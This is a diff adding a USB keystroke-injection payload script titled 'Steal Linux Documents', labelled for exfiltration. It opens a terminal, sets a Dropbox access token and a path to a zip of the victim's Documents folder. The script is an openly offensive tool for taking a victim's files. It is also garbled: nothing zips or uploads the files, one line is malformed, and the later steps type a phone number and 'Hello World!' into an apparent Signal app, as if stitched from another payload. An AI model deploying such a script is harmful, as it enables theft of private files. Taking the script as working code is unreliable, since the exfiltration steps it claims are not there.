@@ -1,0 +1,55 @@
+REM ##########################################
+REM #                                        |
+REM # Title        : Steal Linux Documents   |
+REM # Author       : Aleff                   |
+REM # Version      : 1.0                     |
+REM # Category     : Exfiltration, Execution |
+REM # Target       : Linux                   |
+REM #                                        |
+REM ##########################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Account
+REM     - - DROPBOX_ACCESS_TOKEN
+
+
+DELAY 1000
+CTRL+ALT+t
+DELAY 500
+
+REM Required: Set here your Dropbox access token
+STRING ACCESS_TOKEN="your_dropbox_access_token"
+ENTER
+
+DELAY 500
+STRING NAME=$(whoami)
+ENTER
+
+REM It can be changed with the folder that you want
+STRING FILE_PATH="/home/$NAME/Documents/files.zip"
+FILE_NAME="files.zip"
+ENTER
+DELAY 5000
+TAB
+TAB
+TAB
+ENTER
+DELAY 100
+
+REM REQUIRED - Receiver number
+STRING 3332211000
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 200
+
+REM This is the message that will be sent.
+REM You can change it as you want, if you want.
+STRING Hello World!
+ENTER
+
+REM Closing Signal App
+DELAY 500
+ALT F4
